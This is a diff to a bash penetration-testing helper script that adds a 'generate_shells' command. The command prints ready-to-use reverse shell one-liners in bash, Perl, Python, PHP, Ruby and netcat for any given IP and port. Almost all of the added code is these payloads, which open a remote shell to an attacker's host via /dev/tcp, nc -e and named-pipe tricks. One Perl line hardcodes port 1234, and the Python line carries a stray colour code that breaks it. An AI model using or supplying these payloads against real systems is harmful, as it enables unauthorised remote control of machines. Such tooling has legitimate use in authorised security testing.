@@ -19,6 +19,8 @@ BLUE='\033[1;34m'
 MAGENTA='\033[1;35m'
 
 CLR='\033[0m'
+NEWLINE='\n'
+
 
 __logo="
                       :PB@Bk:
@@ -335,6 +337,36 @@ apk() {
     fi
 }
 
+generate_shells() {
+    clear
+    port=$2
+
+    echo -e "$BLUE[+] OK, here are your shellz...\n$CLR"
+
+    echo -e "\033[41m[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
+    echo -e "\033[41m[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
+    echo -e "\033[41m[bash]\033[0m exec 5<>/dev/tcp/$1/$port | cat <&5 | while read line; do $line 2>&5 >&5; done"
+    echo -e "$NEWLINE"
+    echo -e "\033[42m[perl]\033[0m perl -e 'use Socket;\$i=\"$1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    echo -e "\033[42m[perl]\033[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+    echo -e "\033[42m[perl (Windows)]\033[0m perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+    echo -e "$NEWLINE"
+    echo -e "\033[43m[python]\033[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"\033[0m);'"
+    echo -e "$NEWLINE"
+    echo -e "\033[44m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "$NEWLINE"
+    echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    echo -e "$NEWLINE"
+    echo -e "\033[46m[netcat]\033[0m nc -e /bin/sh $1 $port"
+    echo -e "\033[46m[netcat]\033[0m nc -c /bin/sh $1 $port"
+    echo -e "\033[46m[netcat]\033[0m /bin/sh | nc $1 $port"
+    echo -e "\033[46m[netcat]\033[0m rm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
+    echo -e "\033[46m[netcat]\033[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
+    echo -e "$NEWLINE"
+}
+
 
 cmd=$1
 clear
@@ -397,6 +429,9 @@ case "$cmd" in
     s3go)
         s3go "$2" "$3"
     ;;
+    generate_shells)
+        generate_shells "$2" "$3"
+    ;;
     interactive)
         interactive "$2"
     ;;
@@ -415,10 +450,11 @@ case "$cmd" in
         echo -e "\n::$BLUE AMAZON AWS S3 ::$CLR"
         echo -e "\ts3 [bucket]\t\t\t\t\t -> checks privileges on AWS S3 bucket (ls, cp, mv etc.)"
         echo -e "\ts3go [bucket] [key]\t\t\t\t -> get object identified by [key] from AWS S3 [bucket]"
-        echo -e "\n::$BLUE TOOLS ::$CLR"
+        echo -e "\n::$BLUE PENTEST TOOLS ::$CLR"
         echo -e "\thttp_server [PORT]\t\t\t\t -> runs HTTP server on [PORT] TCP port"
         echo -e "\tprivesc_tools_linux \t\t\t\t -> runs HTTP server on port 9119 in directory with Linux PrivEsc tools"
         echo -e "\tprivesc_tools_windows \t\t\t\t -> runs HTTP server on port 9119 in directory with Windows PrivEsc tools"
+        echo -e "\tgenerate_shells [IP] [PORT] \t\t\t -> generates ready-to-use reverse shells in various languages for given IP:PORT"
         echo -e "\n::$BLUE SMB SUITE ::$CLR"
         echo -e "\tsmb_enum [IP] [USER] [PASSWORD]\t\t\t -> enumerates SMB shares on [IP] as [USER] (eg. null) (445 port has to be open)"
         echo -e "\tsmb_get_file [IP] [user] [password] [PATH] \t -> downloads file from SMB share [PATH] on [IP]"
